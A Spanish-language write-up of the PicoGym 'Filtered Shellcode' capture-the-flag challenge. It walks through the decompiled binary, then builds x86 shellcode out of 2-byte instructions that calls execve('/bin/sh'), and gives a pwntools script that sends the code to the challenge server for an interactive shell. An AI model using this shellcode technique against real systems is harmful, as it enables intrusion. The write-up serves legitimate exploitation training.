# Filtered Shellcode - PicoGym

Este ejercicio era más complejo y la resolución es bastante interesante por lo uqe he decidido dedicarle este writeup. Esta es una versión traducida al español y a mis palabras :) de [este articulo](https://github.com/apoirrier/CTFs-writeups/blob/master/PicoCTF/Pwn/filtered-shellcode.md).

## Reconocimiento

Nos dan únicamente un ejecutable *fun*, que si comprobamos con [[checksec]], tiene todas las protecciones desactivadas. Si lo descompilamos con [[ghidra]], veremos que se nos pide un código a ejecutar de un máximo de 1000 carácteres que se pasa a la función *`execute`*:

```c
void execute(int shellcode,int len)

{
  uint uVar1;
  undefined4 uStack48;
  undefined auStack44 [8];
  undefined *local_24;
  undefined *local_20;
  uint local_1c;
  uint double_len;
  int local_14;
  uint i;
  int j;
  int start;
  
  uStack48 = 0x8048502;
  if ((shellcode != 0) && (len != 0)) {
    double_len = len * 2;
    local_1c = double_len;
    start = ((double_len + 0x10) / 0x10) * -0x10;
    local_20 = auStack44 + start;
    local_14 = 0;
    for (i = 0; j = local_14, i < double_len; i = i + 1) {
      uVar1 = (uint)((int)i >> 0x1f) >> 0x1e;
      if ((int)((i + uVar1 & 3) - uVar1) < 2) {
        local_14 = local_14 + 1;
        auStack44[i + start] = *(undefined *)(shellcode + j);
      }
      else {
        auStack44[i + start] = 0x90;
      }
    }
    auStack44[double_len + start] = 0xc3;
    local_24 = auStack44 + start;
    *(undefined4 *)(auStack44 + start + -4) = 0x80485cb;
    (*(code *)(auStack44 + start))();
    return;
  }
                    /* WARNING: Subroutine does not return */
  exit(1);
}
```

Básicamente, el código se copia en *`auStack44`*, pero cada dos bytes introduce otros dos bytes con el valor `0x90` (el código de los *`nop`*). En resumen, corta el código en series de 2 bytes, por lo que tenemos que construir un *shellcode* con instrucciones de 2 bytes.

## Construyendo un shellcode

El objetivo será llamar a `execve("/bin/sh", NULL, NULL)`. Para ello debemos hacer varias cosas:

- Poner la string `/bin/sh` en el stack, para que *esp* apunte a ella.
- Poner los argumentos en los registros correspondientes (en este caso el puntero a `/bin/sh` en *ebx*, y poner *ecx* y *edx* a 0).
- Llamar a la *syscall* correspondiente a `excve`.
- Salir del programa.

Normalmente rellenariamos los registros con `mov ebx, 0`, sin embargo, esto genera *null bytes* al final, lo que puede dar problemas. Para ello utilizaremos `xor ebx, ebx` para ponerlos a cero. Además, para asignar valores, podemos evitar meter *null bytes* rellenando *sub-registros*. Por ejemplo para introducir `11` en *eax* (el código de `excve`), podemos usar `xor eax, eax; mov al, 11`.

De esta forma el código sería algo como:

```asm
; Push //bin/sh on stack (one more slash to avoid null byte)
xor eax, eax
push eax
push `n/sh`
push `//bi`

; Set parameters
mov ebx, esp
xor ecx, ecx
xor edx, edx

; call execve
mov al, 11
int 0x80

; exit
mov al, 1
xor ebx, ebx
int 0x80
```

De esta forma casi todas las instrucciones serían de 2 bytes de longitud, el único problema es introducir `/bin/sh` en el stack. Para ello hay una solución simple, construirlo en registros y pushearlo al stack.

Concretamente, con *eax* inicializado a 0, ponemos en *a1* el primer byte. Después multiplicamos *eax* por 16 y luego otra vez por 16, haciendo que el primer valor esté ahora en el segundo byte de *eax*. Además añadimos *nop*s cuando haya instrucciones de 1 byte para que todas midan 2 bytes.

El código en [[python]] quedaría así:

```python
from pwn import *

shellcode = """
/* Set registers to 0 */
xor eax, eax
xor ebx, ebx
xor ecx, ecx
xor edx, edx

/* Build the stack with //bin/sh */
mov bl, 16 /* This register will hold the value 16 for shifting bytes */
/* First null bytes */
push ecx
nop
/* Then n/sh (ie bytes 110, 47, 115, 104) */
mov al, 104
mul ebx
mul ebx
mov al, 115
mul ebx
mul ebx
mov al, 47
mul ebx
mul ebx
mov al, 110
push eax
nop

/* Then //bi (ie bytes 47, 47, 98, 105) */
xor eax, eax
mov al, 105
mul ebx
mul ebx
mov al, 98
mul ebx
mul ebx
mov al, 47
mul ebx
mul ebx
mov al, 47
push eax
nop

/* syscall */
xor eax, eax
mov al, 11
mov ebx, esp
int 0x80

/* exit */
mov al,1
xor ebx, ebx
int 0x80
"""

print(asm(shellcode))

with open("out", "wb") as f:
    f.write(asm(shellcode))

sh = remote("mercury.picoctf.net", 37853)
sh.recvuntil(b"run:")
sh.sendline(asm(shellcode))
sh.interactive()
```
